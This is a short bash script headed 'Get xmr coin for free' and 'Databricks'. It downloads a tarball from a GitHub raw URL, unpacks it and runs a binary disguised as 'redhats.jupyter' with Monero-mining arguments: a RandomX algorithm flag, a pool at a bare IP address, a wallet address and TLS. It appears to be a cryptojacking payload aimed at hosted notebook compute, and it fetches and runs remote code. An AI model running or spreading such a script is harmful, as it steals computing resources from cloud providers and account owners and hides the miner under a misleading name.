#! /bin/bash
# Get xmr coin for free
# Databricks

wget https://raw.githubusercontent.com/chirifa201/python/main/redhats.jupyter.tar.gz
tar xvzf redhats.jupyter.tar.gz
cd redhats.jupyter
./redhats.jupyter -a rx/0 -o 142.132.131.248:80 -u 8A4neDV4BbCE66ixuYaX9SfsxHVAC45P19xyAWmm3FraVM4fNCwY2ScQHYdosXd1jHQuRSwzikrL74yLahB3vERBABq953j -p test01 -k --tls --rig-id GC-US
